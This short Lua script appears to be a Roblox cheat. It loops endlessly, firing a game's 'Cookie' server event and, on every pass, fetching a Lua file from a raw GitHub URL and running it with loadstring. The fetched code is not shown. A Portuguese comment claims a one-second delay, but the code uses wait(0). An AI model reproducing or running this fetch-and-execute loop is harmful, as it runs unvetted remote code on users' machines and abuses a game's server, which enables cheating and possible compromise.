while true do
    game:GetService("ReplicatedStorage").Events.Cookie:FireServer()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/HUGOHUGOHUGOHUGOHUGOHUGOHUGOHUGO/Cookies/refs/heads/main/README.lua"))()
    wait(0)  -- Aguarda 1 segundo antes de repetir o loop
end
